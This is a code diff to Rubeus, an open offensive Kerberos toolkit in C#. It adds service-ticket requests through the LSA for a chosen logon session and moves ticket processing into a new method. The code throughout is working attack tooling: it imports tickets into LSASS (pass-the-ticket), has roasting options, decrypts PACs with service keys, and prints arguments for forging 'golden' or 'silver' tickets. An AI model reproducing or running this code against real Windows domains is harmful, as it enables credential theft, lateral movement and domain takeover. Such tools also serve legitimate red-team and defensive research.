@@ -8,6 +8,8 @@ using Rubeus.Asn1;
 using Rubeus.Kerberos;
 using Rubeus.Kerberos.PAC;
 using System.Collections.Generic;
+using System.ComponentModel;
+using static Rubeus.Interop;
 
 namespace Rubeus {
 
@@ -324,7 +326,7 @@ namespace Rubeus {
             }
         }
 
-        public static void TGS(KRB_CRED kirbi, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, string outfile = "", bool ptt = false, string domainController = "", bool display = true, bool enterprise = false, bool roast = false, bool opsec = false, KRB_CRED tgs = null, string targetDomain = "", string servicekey = "", string asrepkey = "", bool u2u = false, string targetUser = "", bool printargs = false, string proxyUrl = null, bool keyList = false, bool dmsa = false)
+        public static void TGS(KRB_CRED kirbi, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, string outfile = "", bool ptt = false, string domainController = "", bool display = true, bool enterprise = false, bool roast = false, bool opsec = false, KRB_CRED tgs = null, string targetDomain = "", string servicekey = "", string asrepkey = "", bool u2u = false, string targetUser = "", bool printargs = false, string proxyUrl = null, bool keyList = false, bool dmsa = false, string serviceType = null, LUID targetLuid = default)
         {
             // kirbi            = the TGT .kirbi to use for ticket requests
             // service          = the SPN being requested
@@ -333,25 +335,61 @@ namespace Rubeus {
             // domainController = the specific domain controller to send the request, defaults to the system's DC
             // display          = true to display the ticket
 
-            // extract out the info needed for the TGS-REQ request
-            string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
-            string domain = kirbi.enc_part.ticket_info[0].prealm;
-            Ticket ticket = kirbi.tickets[0];
-            byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;
+            IntPtr lsaHandle = IntPtr.Zero;
+            int authPackage = 0;
+            var snameType = Helpers.StringToPrincipalType(serviceType);
 
-            // the etype for the PA Data for the request, so needs to match the TGT key type
-            Interop.KERB_ETYPE paEType = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;
+            if (kirbi == null) {
 
-            string[] services = service.Split(',');
-            foreach (string sname in services)
-            {
-                // request the new service ticket
-                TGS(userName, domain, ticket, clientKey, paEType, sname, requestEType, outfile, ptt, domainController, display, enterprise, roast, opsec, tgs, targetDomain, servicekey, asrepkey, u2u, targetUser, printargs, proxyUrl, keyList, dmsa);
+                lsaHandle = LSA.GetLsaHandle();
+                if(lsaHandle == IntPtr.Zero) {
+                    throw new Win32Exception($"Failed to get LSA handle");
+                }
+
+                Interop.LSA_STRING_IN kerbString = new Interop.LSA_STRING_IN("kerberos");
+                if(Interop.LsaLookupAuthenticationPackage(lsaHandle, ref kerbString, out authPackage) != 0) {
+                    throw new Win32Exception($"Failed to get Kerberos authentication package");
+                }
+
+                Console.WriteLine($"[=] Requesting service ticket via LSA authentication package {authPackage} using handle 0x{lsaHandle:x}");
+            }
+
+            string[] services = null;
+
+            if(snameType == PRINCIPAL_TYPE.NT_X500_PRINCIPAL) {
+                services = service.Split('|');
+            } else {
+                services = service.Split(',');
+            }
+            
+            foreach (string sname in services) {
+                
+                if (kirbi != null) {
+                    // request the new service ticket
+                    TGS(kirbi.enc_part.ticket_info[0].pname.name_string[0], kirbi.enc_part.ticket_info[0].prealm , kirbi?.tickets[0], kirbi?.enc_part.ticket_info[0].key.keyvalue, (Interop.KERB_ETYPE)kirbi?.enc_part.ticket_info[0].key.keytype, 
+                        sname, requestEType, outfile, ptt, domainController, display, enterprise, roast, opsec, tgs, targetDomain, servicekey, asrepkey, u2u, targetUser, printargs, proxyUrl, keyList, dmsa, serviceType);
+                } else {
+
+                    var finalSname = sname;
+                    var kdcOptions = Interop.KdcOptions.FORWARDABLE | Interop.KdcOptions.RENEWABLE | Interop.KdcOptions.RENEWABLEOK;
+
+                    if (opsec) {
+                        kdcOptions |= Interop.KdcOptions.CANONICALIZE;
+                    }
+            
+                    if (snameType == PRINCIPAL_TYPE.NT_X500_PRINCIPAL) {
+                        finalSname = $"@@@{finalSname}";
+                    }
+
+                    var cred = LSA.RequestServiceTicket(lsaHandle, authPackage, targetLuid, finalSname, (uint)kdcOptions, false);
+                    ProcessTicketResponse(cred.RawBytes, Convert.ToBase64String(cred.RawBytes), cred, ptt, servicekey, u2u, null, display, asrepkey, null, outfile, printargs, null);
+                }
+                
                 Console.WriteLine();
             }
         }
 
-        public static byte[] TGS(string userName, string domain, Ticket providedTicket, byte[] clientKey, Interop.KERB_ETYPE paEType, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, string outfile = "", bool ptt = false, string domainController = "", bool display = true, bool enterprise = false, bool roast = false, bool opsec = false, KRB_CRED tgs = null, string targetDomain = "", string servicekey = "", string asrepkey = "", bool u2u = false, string targetUser = "", bool printargs = false, string proxyUrl = null, bool keyList = false, bool dmsa = false)
+        public static byte[] TGS(string userName, string domain, Ticket providedTicket, byte[] clientKey, Interop.KERB_ETYPE paEType, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, string outfile = "", bool ptt = false, string domainController = "", bool display = true, bool enterprise = false, bool roast = false, bool opsec = false, KRB_CRED tgs = null, string targetDomain = "", string servicekey = "", string asrepkey = "", bool u2u = false, string targetUser = "", bool printargs = false, string proxyUrl = null, bool keyList = false, bool dmsa = false, string serviceType = null)
         {
 
             if (display)
@@ -382,7 +420,7 @@ namespace Rubeus {
             if (u2u && tgs != null && String.IsNullOrEmpty(service))
                 service = tgs.enc_part.ticket_info[0].pname.name_string[0];
 
-            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, service, providedTicket, clientKey, paEType, requestEType, false, targetUser, enterprise, roast, opsec, false, tgs, targetDomain, u2u, keyList, dmsa);
+            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, service, providedTicket, clientKey, paEType, requestEType, false, targetUser, enterprise, roast, opsec, false, tgs, targetDomain, u2u, keyList, dmsa, serviceType);
 
             byte[] response = null;
             string dcIP = null;
@@ -509,126 +547,9 @@ namespace Rubeus {
 
                 string kirbiString = Convert.ToBase64String(kirbiBytes);
 
-                if (ptt)
-                {
-                    // pass-the-ticket -> import into LSASS
-                    LSA.ImportTicket(kirbiBytes, new LUID());
-                }
-
-                if (String.IsNullOrEmpty(servicekey) && u2u)
-                    servicekey = Helpers.ByteArrayToString(clientKey);
-
-                if (display)
-                {
-                    Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);
-
-                    if (Rubeus.Program.wrapTickets)
-                    {
-                        // display the .kirbi base64, columns of 80 chararacters
-                        foreach (string line in Helpers.Split(kirbiString, 80))
-                        {
-                            Console.WriteLine("      {0}", line);
-                        }
-                    }
-                    else
-                    {
-                        Console.WriteLine("      {0}", kirbiString);
-                    }
-
-                    KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
-
-                    LSA.DisplayTicket(kirbi, 2, false, false, false, false, 
-                        string.IsNullOrEmpty(servicekey) ? null : Helpers.StringToByteArray(servicekey), string.IsNullOrEmpty(asrepkey) ? null : Helpers.StringToByteArray(asrepkey),
-                        null,null,null,string.IsNullOrEmpty(keyListHash) ? null : Helpers.StringToByteArray(keyListHash), null, dmsaCurrentKeys);
-                }
-
-                if (!String.IsNullOrEmpty(outfile))
-                {
-                    outfile = Helpers.MakeValidFileName(outfile);
-                    if (Helpers.WriteBytesToFile(outfile, kirbiBytes))
-                    {
-                        if (display)
-                        {
-                            Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", outfile);
-                        }
-                    }
-                }
-
-                if (!String.IsNullOrEmpty(servicekey) && printargs)
-                {
-                    var decryptedEncTicket = cred.tickets[0].Decrypt(Helpers.StringToByteArray(servicekey), null);
-                    PACTYPE pt = decryptedEncTicket.GetPac(null);
-                    if (pt == null)
-                    {
-                        Console.WriteLine("[X] Unable to get the PAC");
-                        return kirbiBytes;
-                    }
-
-                    string outArgs = String.Empty;
-
-                    foreach (var pacInfoBuffer in pt.PacInfoBuffers)
-                    {
-                        if (pacInfoBuffer is LogonInfo li)
-                        {
-                            outArgs = String.Format("/user:{0} /id:{1} /pgid:{2} /logoncount:{3} /badpwdcount:{4} /sid:{5} /netbios:{6}", li.KerbValidationInfo.EffectiveName, li.KerbValidationInfo.UserId, li.KerbValidationInfo.PrimaryGroupId, li.KerbValidationInfo.LogonCount, li.KerbValidationInfo.BadPasswordCount, li.KerbValidationInfo.LogonDomainId.GetValue(), li.KerbValidationInfo.LogonDomainName);
-                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.FullName.ToString()))
-                                outArgs = String.Format("{0} /displayname:\"{1}\"", outArgs, li.KerbValidationInfo.FullName);
-                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.LogonScript.ToString()))
-                                outArgs = String.Format("{0} /scriptpath:\"{1}\"", outArgs, li.KerbValidationInfo.LogonScript);
-                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.ProfilePath.ToString()))
-                                outArgs = String.Format("{0} /profilepath:\"{1}\"", outArgs, li.KerbValidationInfo.ProfilePath);
-                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.HomeDirectory.ToString()))
-                                outArgs = String.Format("{0} /homedir:\"{1}\"", outArgs, li.KerbValidationInfo.HomeDirectory);
-                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.HomeDirectoryDrive.ToString()))
-                                outArgs = String.Format("{0} /homedrive:\"{1}\"", outArgs, li.KerbValidationInfo.HomeDirectoryDrive);
-                            if (li.KerbValidationInfo.GroupCount > 0)
-                                outArgs = String.Format("{0} /groups:{1}", outArgs, li.KerbValidationInfo.GroupIds?.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
-                            if (li.KerbValidationInfo.SidCount > 0)
-                                outArgs = String.Format("{0} /sids:{1}", outArgs, li.KerbValidationInfo.ExtraSids.GetValue().Select(s => s.Sid.ToString()).Aggregate((cur, next) => cur + "," + next));
-                            if (li.KerbValidationInfo.ResourceGroupCount > 0)
-                                outArgs = String.Format("{0} /resourcegroupsid:{1} /resourcegroups:{2}", outArgs, li.KerbValidationInfo.ResourceGroupDomainSid.GetValue().ToString(), li.KerbValidationInfo.ResourceGroupIds.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
-                            try
-                            {
-                                outArgs = String.Format("{0} /logofftime:\"{1}\"", outArgs, DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.LogoffTime.LowDateTime | ((long)li.KerbValidationInfo.LogoffTime.HighDateTime << 32)).ToLocalTime());
-                            }
-                            catch { }
-                            DateTime? passLastSet = null;
-                            try
-                            {
-                                passLastSet = DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.PasswordLastSet.LowDateTime | ((long)li.KerbValidationInfo.PasswordLastSet.HighDateTime << 32));
-                            }
-                            catch { }
-                            if (passLastSet != null)
-                            {
-                                outArgs = String.Format("{0} /pwdlastset:\"{1}\"", outArgs, ((DateTime)passLastSet).ToLocalTime());
-                                DateTime? passCanSet = null;
-                                try
-                                {
-                                    passCanSet = DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.PasswordCanChange.LowDateTime | ((long)li.KerbValidationInfo.PasswordCanChange.HighDateTime << 32));
-                                }
-                                catch { }
-                                if (passCanSet != null)
-                                    outArgs = String.Format("{0} /minpassage:{1}d", outArgs, (((DateTime)passCanSet) - ((DateTime)passLastSet)).Days);
-                                DateTime? passMustSet = null;
-                                try
-                                {
-                                    passCanSet = DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.PasswordMustChange.LowDateTime | ((long)li.KerbValidationInfo.PasswordMustChange.HighDateTime << 32));
-                                }
-                                catch { }
-                                if (passMustSet != null)
-                                    outArgs = String.Format("{0} /maxpassage:{1}d", outArgs, (((DateTime)passMustSet) - ((DateTime)passLastSet)).Days);
-                            }
-                            if (!String.IsNullOrEmpty(li.KerbValidationInfo.LogonServer.ToString()))
-                                outArgs = String.Format("{0} /dc:{1}.{2}", outArgs, li.KerbValidationInfo.LogonServer.ToString(), cred.tickets[0].realm);
-                            if ((Interop.PacUserAccountControl)li.KerbValidationInfo.UserAccountControl != Interop.PacUserAccountControl.NORMAL_ACCOUNT)
-                                outArgs = String.Format("{0} /uac:{1}", outArgs, String.Format("{0}", (Interop.PacUserAccountControl)li.KerbValidationInfo.UserAccountControl).Replace(" ", ""));
-                        }
-                    }
-
-                    Console.WriteLine("\r\n[*] Printing argument list for use with Rubeus' 'golden' or 'silver' commands:\r\n\r\n{0}\r\n", outArgs);
-                }
-
-                return kirbiBytes;
+                return ProcessTicketResponse(kirbiBytes, kirbiString, cred, ptt, servicekey, u2u, clientKey, display,
+                    asrepkey, keyListHash, outfile, printargs, dmsaCurrentKeys);
+          
             }
             else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
             {
@@ -641,6 +562,108 @@ namespace Rubeus {
                 Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
             }
             return null;
+        }
+
+        static public byte[] ProcessTicketResponse(byte[] kirbiBytes, string kirbiString, KRB_CRED cred, bool ptt, string servicekey, bool u2u, byte[] clientKey, bool display, string asrepkey, string keyListHash, string outfile, bool printargs, PA_DMSA_KEY_PACKAGE dmsaCurrentKeys) {
+
+            if (ptt) {
+                // pass-the-ticket -> import into LSASS
+                LSA.ImportTicket(kirbiBytes, new LUID());
+            }
+
+            if (String.IsNullOrEmpty(servicekey) && u2u)
+                servicekey = Helpers.ByteArrayToString(clientKey);
+
+            if (display) {
+                Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);
+
+                if (Rubeus.Program.wrapTickets) {
+                    // display the .kirbi base64, columns of 80 chararacters
+                    foreach (string line in Helpers.Split(kirbiString, 80)) {
+                        Console.WriteLine("      {0}", line);
+                    }
+                } else {
+                    Console.WriteLine("      {0}", kirbiString);
+                }
+
+                KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
+
+                LSA.DisplayTicket(kirbi, 2, false, false, false, false,
+                    string.IsNullOrEmpty(servicekey) ? null : Helpers.StringToByteArray(servicekey), string.IsNullOrEmpty(asrepkey) ? null : Helpers.StringToByteArray(asrepkey),
+                    null, null, null, string.IsNullOrEmpty(keyListHash) ? null : Helpers.StringToByteArray(keyListHash), null, dmsaCurrentKeys);
+            }
+
+            if (!String.IsNullOrEmpty(outfile)) {
+                outfile = Helpers.MakeValidFileName(outfile);
+                if (Helpers.WriteBytesToFile(outfile, kirbiBytes)) {
+                    if (display) {
+                        Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", outfile);
+                    }
+                }
+            }
+
+            if (!String.IsNullOrEmpty(servicekey) && printargs) {
+                var decryptedEncTicket = cred.tickets[0].Decrypt(Helpers.StringToByteArray(servicekey), null);
+                PACTYPE pt = decryptedEncTicket.GetPac(null);
+                if (pt == null) {
+                    Console.WriteLine("[X] Unable to get the PAC");
+                    return kirbiBytes;
+                }
+
+                string outArgs = String.Empty;
+
+                foreach (var pacInfoBuffer in pt.PacInfoBuffers) {
+                    if (pacInfoBuffer is LogonInfo li) {
+                        outArgs = String.Format("/user:{0} /id:{1} /pgid:{2} /logoncount:{3} /badpwdcount:{4} /sid:{5} /netbios:{6}", li.KerbValidationInfo.EffectiveName, li.KerbValidationInfo.UserId, li.KerbValidationInfo.PrimaryGroupId, li.KerbValidationInfo.LogonCount, li.KerbValidationInfo.BadPasswordCount, li.KerbValidationInfo.LogonDomainId.GetValue(), li.KerbValidationInfo.LogonDomainName);
+                        if (!String.IsNullOrEmpty(li.KerbValidationInfo.FullName.ToString()))
+                            outArgs = String.Format("{0} /displayname:\"{1}\"", outArgs, li.KerbValidationInfo.FullName);
+                        if (!String.IsNullOrEmpty(li.KerbValidationInfo.LogonScript.ToString()))
+                            outArgs = String.Format("{0} /scriptpath:\"{1}\"", outArgs, li.KerbValidationInfo.LogonScript);
+                        if (!String.IsNullOrEmpty(li.KerbValidationInfo.ProfilePath.ToString()))
+                            outArgs = String.Format("{0} /profilepath:\"{1}\"", outArgs, li.KerbValidationInfo.ProfilePath);
+                        if (!String.IsNullOrEmpty(li.KerbValidationInfo.HomeDirectory.ToString()))
+                            outArgs = String.Format("{0} /homedir:\"{1}\"", outArgs, li.KerbValidationInfo.HomeDirectory);
+                        if (!String.IsNullOrEmpty(li.KerbValidationInfo.HomeDirectoryDrive.ToString()))
+                            outArgs = String.Format("{0} /homedrive:\"{1}\"", outArgs, li.KerbValidationInfo.HomeDirectoryDrive);
+                        if (li.KerbValidationInfo.GroupCount > 0)
+                            outArgs = String.Format("{0} /groups:{1}", outArgs, li.KerbValidationInfo.GroupIds?.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
+                        if (li.KerbValidationInfo.SidCount > 0)
+                            outArgs = String.Format("{0} /sids:{1}", outArgs, li.KerbValidationInfo.ExtraSids.GetValue().Select(s => s.Sid.ToString()).Aggregate((cur, next) => cur + "," + next));
+                        if (li.KerbValidationInfo.ResourceGroupCount > 0)
+                            outArgs = String.Format("{0} /resourcegroupsid:{1} /resourcegroups:{2}", outArgs, li.KerbValidationInfo.ResourceGroupDomainSid.GetValue().ToString(), li.KerbValidationInfo.ResourceGroupIds.GetValue().Select(g => g.RelativeId.ToString()).Aggregate((cur, next) => cur + "," + next));
+                        try {
+                            outArgs = String.Format("{0} /logofftime:\"{1}\"", outArgs, DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.LogoffTime.LowDateTime | ((long)li.KerbValidationInfo.LogoffTime.HighDateTime << 32)).ToLocalTime());
+                        } catch { }
+                        DateTime? passLastSet = null;
+                        try {
+                            passLastSet = DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.PasswordLastSet.LowDateTime | ((long)li.KerbValidationInfo.PasswordLastSet.HighDateTime << 32));
+                        } catch { }
+                        if (passLastSet != null) {
+                            outArgs = String.Format("{0} /pwdlastset:\"{1}\"", outArgs, ((DateTime)passLastSet).ToLocalTime());
+                            DateTime? passCanSet = null;
+                            try {
+                                passCanSet = DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.PasswordCanChange.LowDateTime | ((long)li.KerbValidationInfo.PasswordCanChange.HighDateTime << 32));
+                            } catch { }
+                            if (passCanSet != null)
+                                outArgs = String.Format("{0} /minpassage:{1}d", outArgs, (((DateTime)passCanSet) - ((DateTime)passLastSet)).Days);
+                            DateTime? passMustSet = null;
+                            try {
+                                passCanSet = DateTime.FromFileTimeUtc((long)li.KerbValidationInfo.PasswordMustChange.LowDateTime | ((long)li.KerbValidationInfo.PasswordMustChange.HighDateTime << 32));
+                            } catch { }
+                            if (passMustSet != null)
+                                outArgs = String.Format("{0} /maxpassage:{1}d", outArgs, (((DateTime)passMustSet) - ((DateTime)passLastSet)).Days);
+                        }
+                        if (!String.IsNullOrEmpty(li.KerbValidationInfo.LogonServer.ToString()))
+                            outArgs = String.Format("{0} /dc:{1}.{2}", outArgs, li.KerbValidationInfo.LogonServer.ToString(), cred.tickets[0].realm);
+                        if ((Interop.PacUserAccountControl)li.KerbValidationInfo.UserAccountControl != Interop.PacUserAccountControl.NORMAL_ACCOUNT)
+                            outArgs = String.Format("{0} /uac:{1}", outArgs, String.Format("{0}", (Interop.PacUserAccountControl)li.KerbValidationInfo.UserAccountControl).Replace(" ", ""));
+                    }
+                }
+
+                Console.WriteLine("\r\n[*] Printing argument list for use with Rubeus' 'golden' or 'silver' commands:\r\n\r\n{0}\r\n", outArgs);
+            }
+
+            return kirbiBytes;
         }
 
         public static byte[] HandleASREP(AsnElt responseAsn, Interop.KERB_ETYPE etype, string keyString, string outfile, bool ptt, LUID luid = new LUID(), bool describe = false, bool verbose = false, AS_REQ asReq = null, string serviceKey = "", bool getCredentials = false, string dcIP = "")
